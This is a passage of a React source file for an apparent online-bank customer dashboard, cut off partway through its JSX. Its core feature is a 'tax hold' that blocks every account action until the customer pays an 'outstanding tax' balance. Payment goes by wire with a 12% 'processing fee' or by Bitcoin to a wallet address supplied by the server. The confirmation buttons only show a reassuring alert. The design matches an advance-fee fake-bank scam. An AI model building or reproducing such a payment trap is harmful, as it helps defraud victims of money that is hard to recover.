// Customer Dashboard - Professional (No Fake Cards!)
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../api';
import { useLanguage, useTheme } from '../contexts/AppContext';

export function ProfessionalDashboard({ user, logout }) {
  const navigate = useNavigate();
  const [accounts, setAccounts] = useState([]);
  const [transactions, setTransactions] = useState([]);
  const [kycStatus, setKycStatus] = useState(null);
  const [monthlySpending, setMonthlySpending] = useState({ total: 0, categories: {} });
  const [loading, setLoading] = useState(true);
  const [selectedTransaction, setSelectedTransaction] = useState(null);
  const [taxHoldStatus, setTaxHoldStatus] = useState(null);
  const [cards, setCards] = useState([]);
  const [showCardDetails, setShowCardDetails] = useState(null);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState(null);
  const [cryptoTxHash, setCryptoTxHash] = useState('');
  const { t } = useLanguage();
  const { isDark } = useTheme();

  useEffect(() => {
    fetchDashboardData();
    fetchTaxStatus();
  }, []);

  const fetchTaxStatus = async () => {
    try {
      const response = await api.get('/users/me/tax-status');
      setTaxHoldStatus(response.data);
    } catch (err) {
      console.error('Failed to fetch tax status:', err);
    }
  };

  const fetchDashboardData = async () => {
    try {
      const [accountsRes, kycRes, spendingRes, cardsRes] = await Promise.all([
        api.get('/accounts'),
        api.get('/kyc/application'),
        api.get('/insights/monthly-spending').catch(() => ({ data: { total: 0, categories: {} } })),
        api.get('/cards').catch(() => ({ data: { ok: true, data: [] } }))
      ]);
      
      setAccounts(accountsRes.data);
      setKycStatus(kycRes.data.status);
      setMonthlySpending(spendingRes.data);
      setCards(cardsRes.data.data || []);

      if (accountsRes.data.length > 0) {
        const txnRes = await api.get(`/accounts/${accountsRes.data[0].id}/transactions`);
        setTransactions(txnRes.data.slice(0, 5));
      }
    } catch (err) {
      console.error('Failed to fetch dashboard data:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAmount = (cents) => {
    const amount = (cents / 100).toFixed(2);
    return amount.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  };

  const getTotalBalance = () => {
    return accounts.reduce((sum, acc) => sum + acc.balance, 0);
  };

  const formatDate = (dateStr) => {
    const date = new Date(dateStr);
    return date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
  };

  const formatDateTime = (dateStr) => {
    const date = new Date(dateStr);
    return date.toLocaleDateString('en-GB', { 
      day: '2-digit', 
      month: 'short', 
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const formatIBAN = (iban) => {
    if (!iban) return null;
    return iban.replace(/(.{4})/g, '$1 ').trim();
  };

  if (loading) {
    return (
      <div className="container-main py-8">
        <div className="skeleton-card mb-6"></div>
        <div className="stat-tiles-grid mb-8">
          <div className="skeleton-card"></div>
          <div className="skeleton-card"></div>
          <div className="skeleton-card"></div>
          <div className="skeleton-card"></div>
        </div>
      </div>
    );
  }

  return (
    <div className={`container-main py-8 ${isDark ? 'bg-gray-900' : ''}`}>
      {/* Tax Hold Banner */}
      {taxHoldStatus?.is_blocked && (
        <div className={`border-l-4 rounded-lg p-4 mb-6 ${isDark ? 'bg-red-900/20 border-red-600' : 'bg-red-50 border-red-500'}`} data-testid="tax-hold-banner">
          <div className="flex items-start space-x-3">
            <svg className={`w-6 h-6 mt-0.5 flex-shrink-0 ${isDark ? 'text-red-400' : 'text-red-600'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
            <div className="flex-1">
              <h3 className={`font-semibold ${isDark ? 'text-red-400' : 'text-red-800'}`}>{t('accountRestricted')}</h3>
              <p className={`text-sm mt-1 ${isDark ? 'text-red-300' : 'text-red-700'}`}>
                {t('accountRestrictedDesc')}
              </p>
              <div className={`mt-2 p-3 rounded border ${isDark ? 'bg-gray-800/50 border-red-800' : 'bg-white/50 border-red-200'}`}>
                <p className={`text-sm ${isDark ? 'text-red-300' : 'text-red-800'}`}>
                  <span className="font-medium">{t('amountDue')}:</span>{' '}
                  <span className="font-bold text-lg">€{taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                </p>
                <p className={`text-xs mt-1 ${isDark ? 'text-red-400' : 'text-red-600'}`}>{taxHoldStatus.reason}</p>
              </div>
              <div className="mt-4 flex flex-wrap gap-3">
                <button 
                  onClick={() => setShowPaymentModal(true)}
                  className="inline-flex items-center px-4 py-2 bg-red-600 text-white font-medium rounded-lg hover:bg-red-700 transition-colors shadow-sm"
                  data-testid="settle-tax-btn"
                >
                  <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
                  </svg>
                  {t('settleBalanceNow')}
                </button>
                <button 
                  onClick={() => navigate('/support')} 
                  className={`inline-flex items-center px-4 py-2 border font-medium rounded-lg transition-colors ${isDark ? 'border-red-700 text-red-400 hover:bg-red-900/30' : 'border-red-300 text-red-700 hover:bg-red-100'}`}
                >
                  <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                  </svg>
                  {t('contactSupport')}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Payment Modal */}
      {showPaymentModal && taxHoldStatus?.is_blocked && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => { setShowPaymentModal(false); setSelectedPaymentMethod(null); }}>
          <div className="bg-white rounded-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto shadow-2xl" onClick={(e) => e.stopPropagation()}>
            {/* Modal Header */}
            <div className="p-6 border-b border-gray-100">
              <div className="flex justify-between items-start">
                <div>
                  <h2 className="text-xl font-semibold text-gray-900">Settle Outstanding Balance</h2>
                  <p className="text-sm text-gray-500 mt-1">Select your preferred payment method</p>
                </div>
                <button 
                  onClick={() => { setShowPaymentModal(false); setSelectedPaymentMethod(null); }}
                  className="text-gray-400 hover:text-gray-600 transition-colors"
                >
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            {/* Payment Method Selection */}
            {!selectedPaymentMethod && (
              <div className="p-6 space-y-4">
                {/* Bank Wire Option */}
                <button
                  onClick={() => setSelectedPaymentMethod('wire')}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-red-500 hover:bg-red-50/30 transition-all text-left group"
                  data-testid="wire-transfer-option"
                >
                  <div className="flex items-start space-x-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 group-hover:bg-blue-200 transition-colors">
                      <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                      </svg>
                    </div>
                    <div className="flex-1">
                      <div className="flex justify-between items-start">
                        <h3 className="font-semibold text-gray-900">Bank Wire Transfer</h3>
                        <span className="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full font-medium">12% Fee</span>
                      </div>
                      <p className="text-sm text-gray-500 mt-1">
                        Transfer from your external bank account. Processing time: 1-3 business days.
                      </p>
                      <p className="text-xs text-gray-400 mt-2">Subject to a 12% administrative processing fee</p>
                    </div>
                  </div>
                </button>

                {/* Cryptocurrency Option */}
                <button
                  onClick={() => setSelectedPaymentMethod('crypto')}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-red-500 hover:bg-red-50/30 transition-all text-left group"
                  data-testid="crypto-option"
                >
                  <div className="flex items-start space-x-4">
                    <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center flex-shrink-0 group-hover:bg-orange-200 transition-colors">
                      <svg className="w-6 h-6 text-orange-600" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.475-1.243 14.9.358c6.43 1.605 10.342 8.115 8.738 14.546zm-6.35-4.613c.24-1.59-.974-2.45-2.64-3.03l.54-2.153-1.315-.33-.525 2.107c-.345-.087-.705-.167-1.064-.25l.526-2.127-1.32-.33-.54 2.165c-.285-.067-.565-.132-.84-.2l-1.815-.45-.35 1.407s.975.225.955.238c.535.136.63.486.615.766l-1.477 5.92c-.075.166-.24.406-.614.314.015.02-.96-.24-.96-.24l-.66 1.51 1.71.426.93.242-.54 2.19 1.32.327.54-2.17c.36.1.705.19 1.05.273l-.51 2.154 1.32.33.545-2.19c2.24.427 3.93.257 4.64-1.774.57-1.637-.03-2.58-1.217-3.196.854-.193 1.5-.76 1.68-1.93h.01zm-3.01 4.22c-.404 1.64-3.157.75-4.05.53l.72-2.9c.896.23 3.757.67 3.33 2.37zm.41-4.24c-.37 1.49-2.662.735-3.405.55l.654-2.64c.744.18 3.137.52 2.75 2.084v.006z"/>
                      </svg>
                    </div>
                    <div className="flex-1">
                      <div className="flex justify-between items-start">
                        <h3 className="font-semibold text-gray-900">Cryptocurrency</h3>
                        <span className="text-xs bg-green-100 text-green-700 px-2 py-1 rounded-full font-medium">0% Fee</span>
                      </div>
                      <p className="text-sm text-gray-500 mt-1">
                        Pay with Bitcoin (BTC). Instant confirmation upon network verification.
                      </p>
                      <p className="text-xs text-gray-400 mt-2">No processing fees applied</p>
                    </div>
                  </div>
                </button>

                <div className="mt-4 p-3 bg-gray-50 rounded-lg">
                  <p className="text-xs text-gray-500 text-center">
                    Your payment will be reviewed and processed within 24-48 hours. Account restrictions will be lifted upon successful verification.
                  </p>
                </div>
              </div>
            )}

            {/* Bank Wire Transfer Details */}
            {selectedPaymentMethod === 'wire' && (
              <div className="p-6">
                <button 
                  onClick={() => setSelectedPaymentMethod(null)}
                  className="flex items-center text-sm text-gray-500 hover:text-gray-700 mb-4"
                >
                  <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                  </svg>
                  Back to payment methods
                </button>

                <div className="bg-blue-50 border border-blue-200 rounded-xl p-5 mb-5">
                  <h3 className="font-semibold text-blue-900 mb-3">Payment Summary</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-blue-700">Outstanding Balance</span>
                      <span className="text-blue-900 font-medium">€{taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-blue-700">Processing Fee (12%)</span>
                      <span className="text-blue-900 font-medium">€{(taxHoldStatus.tax_amount_due * 0.12)?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                    </div>
                    <div className="border-t border-blue-200 pt-2 mt-2">
                      <div className="flex justify-between">
                        <span className="text-blue-900 font-semibold">Total Amount Due</span>
                        <span className="text-blue-900 font-bold text-lg">€{(taxHoldStatus.tax_amount_due * 1.12)?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="bg-gray-50 rounded-xl p-5 mb-5">
                  <h4 className="font-semibold text-gray-900 mb-3">Wire Transfer Details</h4>
                  <div className="space-y-3 text-sm">
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">Beneficiary Name</label>
                      <p className="font-medium text-gray-900 mt-0.5">{taxHoldStatus.beneficiary_name || 'Not provided'}</p>
                    </div>
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">IBAN</label>
                      <p className="font-mono font-medium text-gray-900 mt-0.5">{taxHoldStatus.iban || 'Not provided'}</p>
                    </div>
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">BIC/SWIFT</label>
                      <p className="font-mono font-medium text-gray-900 mt-0.5">{taxHoldStatus.bic_swift || 'Not provided'}</p>
                    </div>
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">Reference (Required)</label>
                      <p className="font-mono font-medium text-gray-900 mt-0.5 bg-yellow-100 px-2 py-1 rounded inline-block">{taxHoldStatus.reference || 'Not provided'}</p>
                    </div>
                  </div>
                </div>

                <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 text-sm">
                  <div className="flex items-start space-x-2">
                    <svg className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <div>
                      <p className="text-amber-800 font-medium">Important Instructions</p>
                      <ul className="text-amber-700 mt-1 space-y-1 list-disc list-inside">
                        <li>Include the reference number in your transfer</li>
                        <li>Transfer the exact total amount shown above</li>
                        <li>Processing takes 1-3 business days</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <button 
                  onClick={() => { 
                    alert('Payment confirmation received. Our compliance team will verify your wire transfer within 1-3 business days. You will receive an email notification once your account restrictions are lifted.');
                    setShowPaymentModal(false); 
                    setSelectedPaymentMethod(null);
                  }}
                  className="w-full mt-5 py-3 bg-gray-900 text-white font-medium rounded-lg hover:bg-gray-800 transition-colors"
                >
                  I Have Completed the Transfer
                </button>
              </div>
            )}

            {/* Cryptocurrency Details */}
            {selectedPaymentMethod === 'crypto' && (
              <div className="p-6">
                <button 
                  onClick={() => setSelectedPaymentMethod(null)}
                  className="flex items-center text-sm text-gray-500 hover:text-gray-700 mb-4"
                >
                  <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                  </svg>
                  Back to payment methods
                </button>

                <div className="bg-green-50 border border-green-200 rounded-xl p-5 mb-5">
                  <h3 className="font-semibold text-green-900 mb-3">Payment Summary</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-green-700">Outstanding Balance</span>
                      <span className="text-green-900 font-medium">€{taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-700">Processing Fee (0%)</span>
                      <span className="text-green-900 font-medium">€0.00</span>
                    </div>
                    <div className="border-t border-green-200 pt-2 mt-2">
                      <div className="flex justify-between">
                        <span className="text-green-900 font-semibold">Total Amount Due</span>
                        <span className="text-green-900 font-bold text-lg">€{taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="bg-gray-50 rounded-xl p-5 mb-5">
                  <h4 className="font-semibold text-gray-900 mb-3">Bitcoin (BTC) Payment</h4>
                  <div className="space-y-4">
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">Send exactly</label>
                      <p className="font-mono font-bold text-2xl text-gray-900 mt-1">€{taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })} <span className="text-sm font-normal text-gray-500">equivalent in BTC</span></p>
                      <p className="text-xs text-gray-500 mt-1">Use current EUR/BTC exchange rate at time of transfer</p>
                    </div>
                    <div>
                      <label className="text-gray-500 text-xs uppercase tracking-wider">To this wallet address</label>
                      <div className="mt-1 bg-white border border-gray-200 rounded-lg p-3">
                        <p className="font-mono text-sm text-gray-900 break-all select-all">{taxHoldStatus.crypto_wallet || 'Not provided'}</p>
                      </div>
                      <button 
                        onClick={() => navigator.clipboard.writeText(taxHoldStatus.crypto_wallet || '')}
                        className="mt-2 text-sm text-red-600 hover:text-red-700 font-medium flex items-center"
                      >
                        <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                        </svg>
                        Copy Address
                      </button>
                    </div>
                  </div>
                </div>

                <div className="mb-5">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Transaction Hash (Optional)</label>
                  <input
                    type="text"
                    value={cryptoTxHash}
                    onChange={(e) => setCryptoTxHash(e.target.value)}
                    placeholder="Enter your BTC transaction hash for faster verification"
                    className="w-full px-4 py-2.5 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 font-mono text-sm"
                  />
                  <p className="text-xs text-gray-500 mt-1">Providing your transaction hash helps us verify your payment faster</p>
                </div>

                <div className="bg-orange-50 border border-orange-200 rounded-lg p-4 text-sm mb-5">
                  <div className="flex items-start space-x-2">
                    <svg className="w-5 h-5 text-orange-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                    <div>
                      <p className="text-orange-800 font-medium">Before You Send</p>
                      <ul className="text-orange-700 mt-1 space-y-1 list-disc list-inside">
                        <li>Double-check the wallet address before sending</li>
                        <li>Ensure you send the exact EUR equivalent in BTC</li>
                        <li>Blockchain confirmations may take 10-60 minutes</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <button 
                  onClick={() => { 
                    alert('Payment submission received. Our compliance team will verify your transaction within 24-48 hours. You will receive an email confirmation once your account restrictions are lifted.');
                    setShowPaymentModal(false); 
                    setSelectedPaymentMethod(null);
                    setCryptoTxHash('');
                  }}
                  className="w-full py-3 bg-orange-500 text-white font-medium rounded-lg hover:bg-orange-600 transition-colors"
                >
                  Submit Payment Confirmation
                </button>

                <p className="text-xs text-gray-500 text-center mt-3">
                  By clicking submit, you confirm that you have sent the required amount to the wallet address above.
                </p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Welcome + KYC Status */}
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-semibold text-gray-900">Welcome back, {user?.first_name}</h1>
        {kycStatus === 'APPROVED' && <span className="badge badge-success">Verified</span>}
      </div>

      {/* Overview Card */}
      <div className="overview-card">
        <div className="overview-label">overview</div>
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-end gap-4">
          <div>
            <div className="balance-large text-3xl sm:text-5xl">€{formatAmount(getTotalBalance())}</div>
            <div className="balance-small">Available balance</div>
          </div>
          <button onClick={() => accounts[0] && navigate(`/accounts/${accounts[0].id}/transactions`)} className="btn-primary w-full sm:w-auto" disabled={accounts.length === 0}>
            View Account
          </button>
        </div>
      </div>

      {/* 4 Stat Tiles */}
      <div className="stat-tiles-grid">
        <div className="stat-tile">
          <div className="stat-tile-icon">
            <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
          </div>
          <div className="stat-tile-number">{accounts.length}</div>
          <div className="stat-tile-label">{t('accounts')}</div>
          <button onClick={() => {
            if (taxHoldStatus?.is_blocked) {
              alert(`${t('accountRestricted')}\n\n${t('accountRestrictedDesc')}\n\n${t('amountDue')}: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}`);
            } else if (accounts[0]) {
              navigate(`/accounts/${accounts[0].id}/transactions`);
            }
          }} className="stat-tile-link">
            <span>{t('view')}</span><span>→</span>
          </button>
        </div>

        <div className="stat-tile">
          <div className="stat-tile-icon">
            <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
          </div>
          <div className="stat-tile-number">{cards.filter(c => c.status === 'ACTIVE').length}</div>
          <div className="stat-tile-label">{t('cards')}</div>
          <button onClick={() => {
            if (taxHoldStatus?.is_blocked) {
              alert(`${t('accountRestricted')}\n\n${t('accountRestrictedDesc')}\n\n${t('amountDue')}: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}`);
            } else {
              navigate('/cards');
            }
          }} className="stat-tile-link">
            <span>{t('view')}</span><span>→</span>
          </button>
        </div>

        <div className="stat-tile">
          <div className="stat-tile-icon">
            <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
            </svg>
          </div>
          <div className="stat-tile-number">{transactions.length}</div>
          <div className="stat-tile-label">{t('transfers')}</div>
          <button onClick={() => {
            if (taxHoldStatus?.is_blocked) {
              alert(`${t('accountRestricted')}\n\n${t('accountRestrictedDesc')}\n\n${t('amountDue')}: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}`);
            } else {
              navigate('/transfers');
            }
          }} className="stat-tile-link">
            <span>{t('view')}</span><span>→</span>
          </button>
        </div>

        <div className="stat-tile">
          <div className="stat-tile-icon">
            <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
            </svg>
          </div>
          <div className="stat-tile-number">0</div>
          <div className="stat-tile-label">{t('statements')}</div>
          <button onClick={() => {
            if (taxHoldStatus?.is_blocked) {
              alert(`${t('accountRestricted')}\n\n${t('accountRestrictedDesc')}\n\n${t('amountDue')}: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}`);
            } else if (accounts[0]) {
              navigate(`/accounts/${accounts[0].id}/transactions`);
            }
          }} className="stat-tile-link">
            <span>{t('view')}</span><span>→</span>
          </button>
        </div>
      </div>

      {/* Dashboard Grid */}
      <div className="dashboard-grid">
        {/* Left: Accounts + Recent Activity */}
        <div className="space-y-6">
          {/* Accounts */}
          <div>
            <div className="section-header">{t('accounts')}</div>
            {accounts.length === 0 ? (
              <div className="card p-6 text-center">
                <p className="text-gray-600 mb-4">No accounts yet</p>
                <button 
                  onClick={async () => {
                    if (taxHoldStatus?.is_blocked) {
                      alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nPlease settle the required amount to restore full access. For assistance, contact support.`);
                    } else {
                      try { await api.post('/accounts/create'); fetchDashboardData(); } catch(e) {}
                    }
                  }} 
                  className="btn-primary"
                >
                  Create Account
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                {accounts.slice(0, 2).map((account) => (
                  <div key={account.id} className="account-item">
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-gray-900 mb-1">EUR e-Account</p>
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-xs text-gray-500 font-medium">IBAN:</span>
                        <span className="text-xs sm:text-xs text-gray-700 font-mono break-all">{account.iban ? account.iban.match(/.{1,4}/g)?.join(' ') : 'N/A'}</span>
                        {account.iban && (
                          <button
                            onClick={async (e) => {
                              e.stopPropagation();
                              const btn = e.currentTarget;
                              const originalHTML = btn.innerHTML;
                              
                              try {
                                await navigator.clipboard.writeText(account.iban);
                                // Show success feedback
                                btn.innerHTML = '<span class="text-green-600 text-xs font-medium">Copied!</span>';
                                setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);
                              } catch (err) {
                                console.log('Clipboard API failed, trying fallback:', err);
                                // Fallback: Create a temporary input and copy from it
                                try {
                                  const tempInput = document.createElement('input');
                                  tempInput.value = account.iban;
                                  tempInput.style.position = 'fixed';
                                  tempInput.style.left = '-9999px';
                                  document.body.appendChild(tempInput);
                                  tempInput.select();
                                  tempInput.setSelectionRange(0, 99999);
                                  document.execCommand('copy');
                                  document.body.removeChild(tempInput);
                                  btn.innerHTML = '<span class="text-green-600 text-xs font-medium">Copied!</span>';
                                  setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);
                                } catch (fallbackErr) {
                                  // Final fallback: show IBAN in prompt so user can copy manually
                                  window.prompt('Copy your IBAN:', account.iban);
                                }
                              }
                            }}
                            className="p-1.5 sm:p-1 text-gray-500 hover:text-red-600 hover:bg-red-50 rounded-md transition touch-manipulation"
                            title="Copy IBAN"
                            data-testid="copy-iban-btn"
                          >
                            <svg className="w-5 h-5 sm:w-4 sm:h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-lg font-semibold text-gray-900">€{formatAmount(account.balance)}</p>
                      <button 
                        onClick={() => {
                          if (taxHoldStatus?.is_blocked) {
                            alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nPlease settle the required amount to restore full access. For assistance, contact support.`);
                          } else {
                            navigate(`/accounts/${account.id}/transactions`);
                          }
                        }} 
                        className="text-xs text-red-600 hover:text-red-700 font-medium mt-1"
                      >
                        View transactions →
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Recent Activity */}
          <div>
            <div className="section-header">{t('recentActivity')}</div>
            {transactions.length === 0 ? (
              <div className="card p-8 text-center">
                <p className="text-sm text-gray-600 mb-4">{t('noTransactionsYet')}</p>
                <button 
                  onClick={() => {
                    if (taxHoldStatus?.is_blocked) {
                      alert(`${t('accountRestricted')}\n\n${t('accountRestrictedDesc')}\n\n${t('amountDue')}: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}`);
                    } else {
                      navigate('/transfers');
                    }
                  }} 
                  className="btn-primary"
                >
                  {t('makeFirstTransfer')}
                </button>
              </div>
            ) : (
              <div className="card p-4">
                {transactions.map((txn) => {
                  // Professional display from metadata
                  const metadata = txn.metadata || {};
                  const displayType = metadata.display_type || txn.transaction_type?.replace(/_/g, ' ') || 'Transaction';
                  const senderName = metadata.sender_name;
                  const reference = metadata.reference;
                  const description = metadata.description;
                  
                  // Determine if credit or debit
                  const isCredit = ['TOP_UP', 'CREDIT', 'REFUND', 'INTEREST'].includes(txn.transaction_type) || txn.direction === 'CREDIT';
                  const amount = txn.amount || 0;
                  
                  return (
                    <div 
                      key={txn.id} 
                      className="transaction-item cursor-pointer hover:bg-gray-50 rounded-lg transition-colors -mx-2 px-2"
                      onClick={() => {
                        if (taxHoldStatus?.is_blocked) {
                          alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nPlease settle the required amount to restore full access. For assistance, contact support.`);
                        } else {
                          setSelectedTransaction(txn);
                        }
                      }}
                      data-testid="transaction-item"
                    >
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <p className="text-sm font-medium text-gray-900 truncate">{displayType}</p>
                          <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                        {senderName && (
                          <p className="text-xs text-gray-600">From: {senderName}</p>
                        )}
                        {description && (
                          <p className="text-xs text-gray-500 truncate">{description}</p>
                        )}
                        {reference && (
                          <p className="text-xs text-gray-400 font-mono">Ref: {reference}</p>
                        )}
                        {!senderName && !description && (
